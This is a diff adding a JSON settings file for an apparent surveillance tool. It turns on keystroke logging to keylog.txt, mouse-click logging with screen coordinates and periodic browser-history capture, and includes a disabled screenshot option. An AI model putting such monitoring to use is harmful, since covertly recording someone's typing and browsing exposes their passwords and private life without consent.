@@ -1,0 +1,63 @@
+{
+    "logs_location": "logs",
+
+    "keylogger": {
+        "enabled": true,
+        "filename": "keylog.txt",
+
+        "replace": {
+            "[SPACE]": " ",
+            "[SHIFT]": "",
+            "[SHIFT_R]": "",
+            "[CTRL_L]": "",
+            "[CTRL_R]": "",
+            "[ALT_L]": "[ALT]",
+            "[ALT_GR]": "",
+            "[96]": "0",
+            "[97]": "1",
+            "[98]": "2",
+            "[99]": "3",
+            "[100]": "4",
+            "[101]": "5",
+            "[102]": "6",
+            "[103]": "7",
+            "[104]": "8",
+            "[105]": "9",
+            "[106]": "*",
+            "[107]": "+",
+            "[108]": ",",
+            "[109]": "-",
+            "[110]": ".",
+            "[111]": "/",
+            "[F12]": "[EXIT]"
+        }
+    },
+
+    "mouselogger": {
+        "enabled": true,
+        "string_format": "[{btn}MB_{x},{y}]",
+        "ignore_same": true,
+
+        "replace": {
+            "LEFT": "L",
+            "RIGHT": "R",
+            "MIDDLE": "M",
+            "X1": "4",
+            "X2": "5"
+        }
+    },
+
+    "screenshot": {
+        "enabled": false,
+        "filename_format": "prtscr_{index}.png",
+        "interval": 10,
+        "inactivity_skip": true
+    },
+
+    "history": {
+        "enabled": true,
+        "filename_format": "{browser}_history.txt",
+        "interval": 300,
+        "limit": 100
+    }
+}
